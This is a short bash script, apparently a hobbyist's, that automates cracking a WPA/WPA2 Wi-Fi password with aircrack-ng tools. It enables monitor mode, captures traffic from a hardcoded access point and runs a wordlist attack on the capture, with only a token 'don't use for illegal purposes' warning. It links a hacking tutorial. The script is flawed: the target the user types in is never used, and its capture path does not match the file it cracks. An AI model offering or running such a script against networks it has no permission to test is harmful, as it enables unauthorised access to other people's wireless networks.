#!/bin/bash

echo WARNING: Dont use for illegal purposes!
read warning

ifconfig

airmon-ng check kill

airmon-ng start wlan0

airodump-ng wlan0mon

echo Which one?
read Target

#wlan0mon

airodump-ng -c 1 --bssid 80:35:C1:13:C1:2C -w /root wlan0mon

aircrack-ng -a2 -b 80:35:C1:13:C1:2C -w /root/passwords.txt /root/hacking-01.cap

#https://www.geeksforgeeks.org/how-to-hack-wpa-wpa2-wifi-using-kali-linux/
#https://www.youtube.com/watch?v=JXFloaN_D-8
